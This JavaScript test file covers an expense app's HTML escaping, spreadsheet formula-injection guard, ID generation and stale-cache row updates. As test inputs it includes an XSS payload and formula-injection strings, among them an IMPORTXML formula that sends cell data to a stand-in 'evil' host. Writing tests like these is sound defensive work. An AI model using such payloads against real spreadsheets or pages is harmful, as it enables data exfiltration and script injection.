// Run from the dev/ folder with:   node --test        (Node 20+; nothing to install)
import test from 'node:test';
import assert from 'node:assert/strict';

import { escapeHtml, renderChatText } from '../htmlSafe.js';
import SheetsApi, { neutralizeFormula } from '../sheetsApi.js';
import GoogleAuth from '../googleAuth.js';

// ── htmlSafe ───────────────────────────────────────────────────────────────────

test('renderChatText keeps bold + newlines for normal messages', () => {
  assert.equal(renderChatText('You spent **$120** on food.\nNice!'), 'You spent <strong>$120</strong> on food.<br>Nice!');
});

test('renderChatText neutralizes HTML/script injection', () => {
  const evil = '<img src=x onerror=alert(1)> <script>steal()</script> **ok**';
  const out = renderChatText(evil);
  assert.ok(!out.includes('<img'));
  assert.ok(!out.includes('<script'));
  assert.ok(out.includes('&lt;img src=x onerror=alert(1)&gt;'));
  assert.ok(out.includes('<strong>ok</strong>'));
});

test('escapeHtml handles quotes, ampersands and non-strings', () => {
  assert.equal(escapeHtml(`a&b "c" 'd'`), 'a&amp;b &quot;c&quot; &#39;d&#39;');
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
  assert.equal(escapeHtml(42), '42');
});

// ── formula-injection guard ────────────────────────────────────────────────────

test('neutralizeFormula quotes anything a spreadsheet would execute', () => {
  assert.equal(neutralizeFormula('=IMPORTXML("https://evil/?"&A1,"//a")'), `'=IMPORTXML("https://evil/?"&A1,"//a")`);
  assert.equal(neutralizeFormula('@SUM(A1)'), `'@SUM(A1)`);
  assert.equal(neutralizeFormula('+IMPORTDATA("x")'), `'+IMPORTDATA("x")`);
  assert.equal(neutralizeFormula('-cmd|calc'), `'-cmd|calc`);
});

test('neutralizeFormula leaves normal data untouched', () => {
  for (const v of ['Groceries', '12.50', '-12.50', '+5', '-5', '1,234.56', '-0,5', '2025-01-02', '', 'Rent = 1200', 'v_abc_123', '[]', '{"a":1}', 42, null, true]) {
    assert.equal(neutralizeFormula(v), v, String(v));
  }
});

// ── generateId ─────────────────────────────────────────────────────────────────

test('generateId keeps its shape and does not collide', () => {
  const ids = new Set();
  for (let i = 0; i < 5000; i++) ids.add(SheetsApi.generateId());
  assert.equal(ids.size, 5000);
  for (const id of ids) assert.match(id, /^v_[0-9a-z]+_[0-9a-z]{6}$/);
});

// ── row-index verification (stale cache protection) ────────────────────────────

/** Tiny in-memory Google Sheet that answers the few endpoints updateRow() uses. */
function fakeSheet(initialRows) {
  const state = { rows: initialRows.map((r) => [...r]), log: [] };
  const original = globalThis.fetch;
  const tokenOriginal = GoogleAuth.getAccessToken;
  GoogleAuth.getAccessToken = async () => 'test-token';
  globalThis.fetch = async (url, init = {}) => {
    const u = new URL(url);
    const m = decodeURIComponent(u.pathname).match(/\/values\/(.+)$/);
    const range = m ? m[1] : '';
    const method = init.method || 'GET';
    state.log.push(`${method} ${range}`);
    const ok = (json) => new Response(JSON.stringify(json), { status: 200 });
    if (method === 'GET') {
      const cell = range.match(/^Expenses!A(\d+)$/);
      if (cell) {
        const row = state.rows[Number(cell[1]) - 2];
        return ok(row ? { values: [[row[0]]] } : {});
      }
      if (range === 'Expenses!A2:Z') return ok({ values: state.rows });
    }
    if (method === 'PUT') {
      const row = Number(range.match(/^Expenses!A(\d+):Z/)[1]);
      state.rows[row - 2] = JSON.parse(init.body).values[0];
      state.written = { row, values: JSON.parse(init.body).values[0] };
      return ok({});
    }
    throw new Error('unexpected request: ' + method + ' ' + url);
  };
  state.restore = () => { globalThis.fetch = original; GoogleAuth.getAccessToken = tokenOriginal; };
  return state;
}

test('updateRow writes to the right row even after a collaborator deleted a row above it', async () => {
  const sheet = fakeSheet([['id1', 'A'], ['id2', 'B'], ['id3', 'C']]);
  const realNow = Date.now;
  try {
    await SheetsApi.getTabData('sheet-x', 'Expenses');           // cache: id3 -> row 4
    sheet.rows.shift();                                          // collaborator deletes id1: id3 is now row 3
    Date.now = () => realNow() + 60_000;                          // cache is now "old"
    await SheetsApi.updateRow('sheet-x', 'Expenses', 'id3', ['id3', 'C-edited']);
    assert.equal(sheet.written.row, 3, 'must write to row 3, not the stale row 4');
    assert.deepEqual(sheet.rows, [['id2', 'B'], ['id3', 'C-edited']]);
  } finally { Date.now = realNow; sheet.restore(); SheetsApi.invalidateCache('sheet-x'); }
});

test('updateRow skips the extra verification read when the cache is brand new', async () => {
  const sheet = fakeSheet([['id1', 'A'], ['id2', 'B']]);
  try {
    await SheetsApi.getTabData('sheet-y', 'Expenses');
    sheet.log.length = 0;
    await SheetsApi.updateRow('sheet-y', 'Expenses', 'id2', ['id2', 'B2']);
    assert.deepEqual(sheet.log, ['PUT Expenses!A3:Z3']);
  } finally { sheet.restore(); SheetsApi.invalidateCache('sheet-y'); }
});

test('updateRow neutralizes formulas in the values it writes', async () => {
  const sheet = fakeSheet([['id1', 'A']]);
  try {
    await SheetsApi.getTabData('sheet-z', 'Expenses');
    await SheetsApi.updateRow('sheet-z', 'Expenses', 'id1', ['id1', '=IMPORTXML("https://evil","//x")', '-25.5']);
    assert.deepEqual(sheet.written.values, ['id1', `'=IMPORTXML("https://evil","//x")`, '-25.5']);
  } finally { sheet.restore(); SheetsApi.invalidateCache('sheet-z'); }
});
